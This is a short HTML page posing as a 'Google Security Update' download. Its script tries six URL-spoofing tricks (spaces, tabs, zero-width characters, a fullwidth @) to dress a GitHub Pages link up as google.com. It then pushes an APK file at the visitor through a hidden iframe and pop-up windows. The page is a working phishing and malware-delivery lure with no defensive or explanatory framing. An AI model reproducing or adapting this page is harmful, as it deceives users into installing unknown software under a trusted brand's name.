<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Security Update</title>
</head>
<body>
  <button onclick="trySpoofMethods()">Download Security Update</button>

  <script>
    function trySpoofMethods() {
      const methods = [
        // Method 1: Using spaces and invisible characters
        "https://google.com @ryynx88.github.io/chy.apk",
        
        // Method 2: Using zero-width characters
        "https://google.com\u200B@ryynx88.github.io/chy.apk",
        
        // Method 3: Using tab character
        "https://google.com\t@ryynx88.github.io/chy.apk",
        
        // Method 4: Multiple zero-width spaces
        "https://google.com\u200B\u200C\u200D@ryynx88.github.io/chy.apk",
        
        // Method 5: Using fullwidth @
        "https://google.comï¼ ryynx88.github.io/chy.apk",
        
        // Method 6: Using mixed invisible chars
        "https://google.com \u200B @ryynx88.github.io/chy.apk"
      ];

      methods.forEach((url, index) => {
        setTimeout(() => {
          console.log(`Trying method ${index + 1}`);
          
          // Try with iframe
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = url;
          document.body.appendChild(iframe);
          
          // Try with window.open
          window.open(url, `frame${index}`);
          
        }, index * 800);
      });
    }
  </script>
</body>
</html>
